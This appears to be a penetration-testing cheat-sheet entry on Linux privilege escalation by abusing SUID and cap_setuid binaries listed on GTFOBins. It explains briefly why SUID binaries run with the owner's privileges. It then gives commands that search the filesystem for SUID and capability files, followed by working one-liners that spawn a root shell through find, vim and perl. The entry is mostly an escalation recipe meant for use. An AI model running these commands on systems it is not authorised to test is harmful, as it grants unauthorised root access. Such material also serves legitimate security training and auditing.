# 12.05 SUID Capabilities GTFOBins

> Abuse SUID/cap_setuid binaries from GTFOBins (`find`, `vim`, `less`, `awk`, `python`) for instant root.

## Overview

SUID files run with file owner's UID. Many common binaries (find, vim, less, awk, python) escalate trivially when SUID. Same for capabilities (cap_setuid+ep on python).

## Steps

- **find / -perm -4000 2>/dev/null** — SUID files.
- **getcap -r / 2>/dev/null** — capability files.
- **Lookup on GTFOBins** for the exact escalation.

## Commands

### Hunt + classic abuses

```bash
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
# Common abuses
find . -exec /bin/sh -p \\; -quit
vim.basic -c ':!/bin/sh -p'
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh -p"'
```
